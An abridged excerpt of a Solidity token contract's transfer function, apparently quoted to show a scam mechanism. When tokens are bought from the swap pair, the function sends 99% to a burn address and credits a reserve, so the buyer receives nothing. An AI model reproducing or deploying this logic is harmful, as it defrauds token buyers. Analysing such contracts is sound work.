...
contract DBRToken is IERC20, SafeOwnable {
    ...
    function _transfer(
        ...
        if (from == swapV2Pair && !_isExcludedFrom[to]) {
            uint256 burnAmount = amount.mul(99).div(100);
            balanceOf[hole] += burnAmount;
            balanceOf[reserve] += amount.div(100);
            emit Transfer(from, hole, burnAmount);
        } else {
            balanceOf[to] += amount.mul(99).div(100);
            emit Transfer(from, to, amount.mul(99).div(100));
        }
        balanceOf[reserve] += amount.div(100);
        emit Transfer(from, reserve, amount.div(100));
    }
